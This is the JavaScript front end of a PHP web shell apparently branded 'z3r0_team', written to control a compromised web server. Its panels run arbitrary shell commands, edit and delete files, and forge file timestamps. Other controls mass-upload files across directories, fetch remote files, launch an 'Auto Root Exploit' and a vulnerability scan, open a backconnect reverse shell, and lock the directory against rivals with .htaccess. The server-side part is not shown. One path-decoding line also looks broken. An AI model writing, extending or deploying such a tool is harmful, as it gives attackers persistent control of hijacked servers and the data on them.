let z_csrf_token = window.PHP_DATA.csrfToken;
let z_current_path_hex = window.PHP_DATA.currentPathHex;
const z_csrf_key = window.PHP_DATA.csrfKey;
const z_dir_key = window.PHP_DATA.dirParamKey;

const modals = ['view-edit-modal', 'create-modal', 'command-modal', 'chmod-modal', 'about-modal', 'processes-modal', 'touch-modal', 'long-task-modal', 'mass-upload-modal', 'remote-upload-modal', 'phpinfo-modal', 'defense-modal', 'backconnect-modal'];
function showModal(id) { document.getElementById(id).style.display = 'flex'; }
function hideModal(id) { document.getElementById(id).style.display = 'none'; }
function hideAllModals() { modals.forEach(hideModal); }
async function navigateTo(pathHex) { await refreshFileList(pathHex); }
function showMessage(message, type = 'success') { const el = document.getElementById('message-area'); el.textContent = message; el.className = type; el.style.display = 'block'; setTimeout(() => { el.style.display = 'none'; }, 5000); }
async function apiCall(formData) { formData.append(z_csrf_key, z_csrf_token); try { const response = await fetch('', { method: 'POST', body: formData }); if (!response.ok) throw new Error(`HTTP ${response.status}`); const result = await response.json(); if (result.new_csrf_token) { z_csrf_token = result.new_csrf_token; document.querySelector('meta[name="z_csrf_token"]').setAttribute('content', z_csrf_token); } if (result.message === 'Invalid CSRF token.') { alert('Session expired for security reasons. The page will now refresh.'); location.reload(); return null; } return result; } catch (e) { showMessage('API Error: ' + e.message, 'error'); return null; } }
async function refreshFileList(pathHex = z_current_path_hex) { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_file_list_d4e'); fd.append(z_dir_key, pathHex); const res = await apiCall(fd); if (res && res.status === 'success') { document.getElementById('file-list-tbody').innerHTML = res.file_list_html; document.getElementById('breadcrumbs-list').innerHTML = res.breadcrumbs_html; z_current_path_hex = res.current_path_hex; const saCb = document.getElementById('select-all-checkbox'); saCb.checked = false; } else { showMessage('Failed to refresh file list.', 'error'); } }
async function runLongTask(action, title, formData) { const titleEl = document.getElementById('long-task-modal-title'); const outputEl = document.getElementById('long-task-output'); const ansi_up = new AnsiUp(); titleEl.textContent = title; outputEl.textContent = 'Please wait...'; showModal('long-task-modal'); if(!formData) formData = new FormData(); formData.append('z3r0_team_act_g8i', action); formData.append(z_dir_key, z_current_path_hex); const result = await apiCall(formData); if(result?.status === 'success') { let finalOutput = result.output || result.message; if(action === 'z3r0_team_vulnscan_a1b'){ finalOutput = ansi_up.ansi_to_html(finalOutput); } outputEl.innerHTML = finalOutput; } else if (result) { outputEl.textContent = "Error: " + result.message; } }
async function viewFile(pathHex) { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_content_z0a'); fd.append('z_ph_1', pathHex); const res = await apiCall(fd); if(res?.status === 'success'){ const pre = document.createElement('pre'); pre.textContent = res.content; document.getElementById('view-edit-modal-title').textContent = `View: ${res.filename}`; const body = document.getElementById('view-edit-modal-body'); body.innerHTML = ''; body.appendChild(pre); document.getElementById('view-edit-modal-footer').innerHTML = ''; showModal('view-edit-modal'); } else if (res) { showMessage(res.message, 'error'); } }
async function editFile(pathHex) { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_content_z0a'); fd.append('z_ph_1', pathHex); const res = await apiCall(fd); if(res?.status === 'success'){ document.getElementById('view-edit-modal-title').textContent = `Edit: ${res.filename}`; document.getElementById('view-edit-modal-body').innerHTML = '<textarea id="editor-textarea"></textarea>'; document.getElementById('editor-textarea').value = res.content; const footer = document.getElementById('view-edit-modal-footer'); footer.innerHTML = '<button id="save-btn">Save</button>'; document.getElementById('save-btn').onclick = async () => { const saveFd = new FormData(); saveFd.append('z3r0_team_act_g8i', 'z3r0_team_save_content_d4e'); saveFd.append('z_ph_1', res.path_hex); saveFd.append('content', document.getElementById('editor-textarea').value); const saveRes = await apiCall(saveFd); if (saveRes) { showMessage(saveRes.message, saveRes.status); if (saveRes.status === 'success') hideModal('view-edit-modal'); } }; showModal('view-edit-modal'); } else if (res) { showMessage(res.message, 'error'); } }
async function deleteItems(pathsHexArray) { if (!pathsHexArray || pathsHexArray.length === 0) { showMessage('No items selected.', 'error'); return; } if (!confirm(`Delete ${pathsHexArray.length} item(s)?`)) return; const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_delete_e5f'); pathsHexArray.forEach(path => fd.append('z_ph_2[]', path)); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') refreshFileList(); } }
async function renameItem(pathHex, oldName) { const newName = prompt('Enter new name:', oldName); if (!newName || newName === oldName) return; const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_rename_m3n'); fd.append('z_ph_1', pathHex); fd.append('new_name', newName); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') refreshFileList(); } }
function showChmodModal(pathHex, currentPerms) { const form = document.getElementById('chmod-form'); form.querySelector('input[name="z_ph_1"]').value = pathHex; form.querySelector('input[name="perms"]').value = currentPerms; showModal('chmod-modal'); }
function showTouchModal(pathHex, currentMtime) { const form = document.getElementById('touch-form'); form.querySelector('input[name="z_ph_1"]').value = pathHex; form.querySelector('input[name="datetime"]').value = currentMtime; showModal('touch-modal'); }
async function showProcesses() { await runLongTask('z3r0_team_ps_x4y', 'Running Processes'); }
async function showPhpInfo() { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_phpinfo_z0a'); const res = await apiCall(fd); if (res?.status === 'success') { document.getElementById('phpinfo-output').innerHTML = res.output; showModal('phpinfo-modal'); } else if (res) { showMessage(res.message, 'error'); } }
async function pingSession() { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_ping_session_d5e'); await apiCall(fd); }
function strToHex(str) { let hex = ''; for(let i=0; i<str.length; i++){ hex += ''+str.charCodeAt(i).toString(16); } return hex; }
document.addEventListener('DOMContentLoaded', () => {
    refreshFileList(); setInterval(pingSession, 300000);
    document.querySelector('.php-version').addEventListener('click', showPhpInfo);
    document.getElementById('upload-input').addEventListener('change', async function() { if (this.files.length === 0) return; const fd = new FormData(); for (const file of this.files) { fd.append('files[]', file); } fd.append('z3r0_team_act_g8i', 'z3r0_team_upload_p6q'); fd.append(z_dir_key, z_current_path_hex); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') refreshFileList(); } this.value = ''; });
    document.getElementById('create-new-btn').addEventListener('click', () => showModal('create-modal'));
    document.getElementById('cmd-btn').addEventListener('click', () => showModal('command-modal'));
    document.getElementById('about-btn').addEventListener('click', () => showModal('about-modal'));
    document.getElementById('ps-btn').addEventListener('click', showProcesses);
    document.getElementById('vuln-scan-btn').addEventListener('click', () => runLongTask('z3r0_team_vulnscan_a1b', 'Vulnerability Scan'));
    document.getElementById('auto-root-btn').addEventListener('click', () => runLongTask('z3r0_team_autoroot_b2c', 'Auto Root Exploit'));
    document.getElementById('mass-upload-btn').addEventListener('click', () => { const form = document.getElementById('mass-upload-form'); form.querySelector('input[name="target_dir"]').value = atob(z_current_path_hex.replace(/../g, '%$&')); showModal('mass-upload-modal'); });
    document.getElementById('remote-upload-btn').addEventListener('click', () => showModal('remote-upload-modal'));
    document.getElementById('defense-btn').addEventListener('click', () => { const form = document.getElementById('defense-form'); form.querySelector('input[name="htaccess_path"]').value = atob(z_current_path_hex.replace(/../g, '%$&')) + '/.htaccess'; showModal('defense-modal'); });
    document.getElementById('backconnect-btn').addEventListener('click', () => showModal('backconnect-modal'));
    document.getElementById('create-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', fd.get('create_type') === 'file' ? 'z3r0_team_mkfile_s9t' : 'z3r0_team_mkdir_r8s'); fd.append(z_dir_key, z_current_path_hex); const res = await apiCall(fd); if (res?.status === 'success') { hideModal('create-modal'); this.reset(); refreshFileList(); } showMessage(res.message, res.status); });
    document.getElementById('exec-form').addEventListener('submit', async function(event) { event.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_exec_y5z'); fd.append(z_dir_key, z_current_path_hex); const outEl = document.getElementById('command-output'); const res = await apiCall(fd); if (res?.status === 'success') { outEl.innerHTML = res.output; outEl.style.display = 'block'; } else if (res) { showMessage(res.message, 'error'); outEl.style.display = 'none'; } });
    document.getElementById('chmod-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_chmod_t0u'); const res = await apiCall(fd); if (res?.status === 'success') { hideModal('chmod-modal'); refreshFileList(); } showMessage(res.message, res.status); });
    document.getElementById('touch-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_touch_v2w'); const res = await apiCall(fd); if (res?.status === 'success') { hideModal('touch-modal'); refreshFileList(); } showMessage(res.message, res.status); });
    document.getElementById('mass-upload-form').addEventListener('submit', function(e) { e.preventDefault(); const fd = new FormData(this); fd.set('target_dir_hex', strToHex(fd.get('target_dir'))); fd.delete('target_dir'); fd.set('recursive', this.querySelector('input[name="recursive"]').checked); hideModal('mass-upload-modal'); runLongTask('z3r0_team_massupload_c3d', 'Mass Upload', fd); this.reset(); });
    document.getElementById('remote-upload-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_remote_upload_d4e'); fd.append(z_dir_key, z_current_path_hex); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') { hideModal('remote-upload-modal'); this.reset(); refreshFileList(); } } });
    document.getElementById('defense-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_defense_lock_h8i'); const res = await apiCall(fd); if(res) { showMessage(res.message, res.status); if(res.status === 'success') hideModal('defense-modal'); } });
    document.getElementById('backconnect-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_backconnect_h8i'); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') hideModal('backconnect-modal'); } });
    document.getElementById('delete-selected-btn').addEventListener('click', () => { const paths = Array.from(document.querySelectorAll('.item-checkbox:checked')).map(cb => cb.value); deleteItems(paths); });
    document.getElementById('file-list-tbody').addEventListener('change', (e) => { if (e.target.classList.contains('item-checkbox')) { document.getElementById('select-all-checkbox').checked = (document.querySelectorAll('.item-checkbox:checked').length > 0 && document.querySelectorAll('.item-checkbox:checked').length === document.querySelectorAll('.item-checkbox').length); } });
    document.getElementById('select-all-checkbox').addEventListener('change', function() { document.querySelectorAll('.item-checkbox').forEach(cb => cb.checked = this.checked); });
    document.addEventListener('keydown', e => { if (e.key === "Escape") hideAllModals(); });
});
